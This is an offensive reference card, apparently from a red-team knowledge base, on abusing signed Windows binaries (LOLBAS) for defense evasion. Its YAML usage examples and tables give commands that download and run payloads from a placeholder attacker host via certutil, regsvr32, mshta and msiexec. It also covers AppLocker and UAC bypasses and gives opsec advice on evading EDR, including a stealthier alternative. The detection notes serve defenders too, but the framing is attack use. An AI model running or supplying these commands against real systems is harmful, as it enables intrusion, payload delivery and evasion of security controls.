---
name: LOLBAS — Living Off the Land Binaries and Scripts
category: defense-evasion
subcategories: [lolbin, signed-binary, trusted-execution, lolbas]
tradecraft_tags: [lolbin, lolbas, signed, trusted, whitelisted, defense-evasion, applocker-bypass]
mitre_attack:
  - id: T1218
    name: System Binary Proxy Execution
  - id: T1202
    name: Indirect Command Execution
source:
  url: https://lolbas-project.github.io/
  license: none
  maintained: true
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64, x86]
privilege_required: user
network_required: false
detection_signal: |
  LOLBAS techniques use legitimate signed Microsoft binaries for malicious purposes.
  Detection focuses on anomalous use of the binary: rundll32.exe loading non-standard
  DLLs, mshta.exe opening HTTP URLs, certutil.exe making network connections, etc.
  Modern EDR has specific behavioral signatures for LOLBin misuse patterns.
usage_examples:
  - description: certutil — decode base64 payload from disk
    args: "certutil.exe -decode encoded.b64 payload.exe"
  - description: certutil — download file from URL
    args: "certutil.exe -urlcache -split -f http://ATTACKER/payload.exe payload.exe"
  - description: regsvr32 — load COM scriptlet (AppLocker bypass)
    args: "regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll"
  - description: mshta — execute HTA from URL
    args: "mshta.exe http://ATTACKER/payload.hta"
  - description: wscript — execute VBScript
    args: "wscript.exe payload.vbs"
  - description: cmstp — bypass UAC + execute INF
    args: "cmstp.exe /s payload.inf"
  - description: Microsoft.Workflow.Compiler.exe — .NET code execution
    args: "Microsoft.Workflow.Compiler.exe payload.xml out.txt"
  - description: Installutil — .NET code via InstallUtil
    args: "installutil.exe /logfile= /LogToConsole=false /U payload.dll"
  - description: msiexec — execute MSI payload
    args: "msiexec /q /i http://ATTACKER/payload.msi"
opsec_notes: |
  LOLBINs are signed Microsoft binaries — they inherently have some level of trust.
  However, modern EDR has extensive behavioral signatures for LOLBin misuse. The most
  valuable use cases are AppLocker/Software Restriction Policy bypass (where unsigned
  binaries are blocked but these are signed), AMSI bypass attempts, and environments
  that block specific tools but not these built-ins. Many LOLBINs generate suspicious
  event patterns that defenders actively hunt (certutil network connections, regsvr32
  COM loading from network, etc.).
gotchas: |
  Many "classic" LOLBINs are now heavily signatured. certutil URL fetch, regsvr32
  remote SCT, mshta HTA URL are among the most detected. Use LOLBINs selectively:
  they are most effective against Application Whitelisting (AppLocker/SRP) rather
  than behavior-based EDR. For modern EDR environments, .NET assemblies via Apollo
  inline_assembly are generally stealthier than LOLBINs.
related_ttps: [amsi-bypass, uac-bypass, process-injection, inceptor]
alternatives: [apollo-inline-assembly, powershell-import]
common_args: {}
last_updated: 2026-05-29
---

# LOLBAS — Living Off the Land Binaries and Scripts

Reference for offensive use of legitimate, signed Windows binaries and scripts
for execution, download, bypass, and other capabilities. The LOLBAS project
(https://lolbas-project.github.io/) maintains the authoritative catalog.

## High-Value LOLBINs by Category

### Download / Fetch

| Binary | Command | Notes |
|--------|---------|-------|
| `certutil.exe` | `-urlcache -split -f URL output` | Very detected |
| `bitsadmin.exe` | `/transfer job /download /priority normal URL output` | Detected |
| `Invoke-WebRequest` | PowerShell built-in | Detected by AMSI |
| `curl.exe` (Win10+) | Built-in curl | Less detected |
| `msiexec.exe` | `/q /i http://URL/payload.msi` | Execute + download |

### Execution / Proxy

| Binary | Technique | Notes |
|--------|-----------|-------|
| `rundll32.exe` | Load DLL, call export | `rundll32 shell32.dll,ShellExec_RunDLL` |
| `regsvr32.exe` | AppLocker bypass via SCT | Remote SCT is highly detected |
| `mshta.exe` | HTA execution | `mshta http://URL/payload.hta` |
| `wscript.exe` | VBScript execution | `wscript payload.vbs` |
| `cscript.exe` | Same as wscript | Less common |
| `installutil.exe` | .NET InstallUtil bypass | `installutil /U payload.dll` |
| `msbuild.exe` | .NET code via CSPROJ | `msbuild payload.csproj` |
| `Microsoft.Workflow.Compiler.exe` | .NET code execution | Less signatured |
| `cmstp.exe` | COM scriptlet + UAC bypass | Works on older Windows |
| `msiexec.exe` | MSI execution | `msiexec /q /i payload.msi` |

### Encoding / Decode

| Binary | Command | Notes |
|--------|---------|-------|
| `certutil.exe` | `-decode input output` | Decode base64 |
| `certutil.exe` | `-encode input output` | Encode base64 |

### Compile / Build

| Binary | Command | Notes |
|--------|---------|-------|
| `msbuild.exe` | `msbuild payload.csproj` | Build and execute C# inline |
| `csc.exe` | `csc /out:payload.exe payload.cs` | Compile C# |
| `vbc.exe` | `vbc /out:payload.exe payload.vb` | Compile VB.NET |

### AppLocker/WDAC Bypass

Most effective against SRP/AppLocker rules that trust signed binaries but not user-land executables:
- `regsvr32.exe` — bypass via COM scriptlet
- `msbuild.exe` — execute C# inline in project file
- `installutil.exe` — execute via InstallUtil attribute
- `Microsoft.Workflow.Compiler.exe` — .NET via workflow XAMLX

### UAC Bypass

- `cmstp.exe` — UAC bypass via auto-elevate COM (patched on Windows 11)
- `fodhelper.exe` — via HKCU registry key (see uac-bypass.md)

## Detection State

Modern EDR has high-confidence detection for:
- `certutil.exe` making HTTP connections
- `regsvr32.exe` loading SCT from network
- `mshta.exe` loading HTA from network
- `msbuild.exe` with inline C# task

Moderately detected:
- `Microsoft.Workflow.Compiler.exe` (less common, fewer signatures)
- `installutil.exe /U` (detected but less reliably)

## When to Use LOLBINs

LOLBINs are most valuable for:
1. **AppLocker/SRP bypass** — when custom binaries are blocked but signed Microsoft tools are not
2. **Constrained language mode escape** — MSBUILD/REGSVR32 can execute in Full Language mode
3. **Environments without EDR** — but are rare in 2026

For environments with modern behavioral EDR (CrowdStrike, SentinelOne), Apollo
inline_assembly is generally stealthier than most LOLBINs.
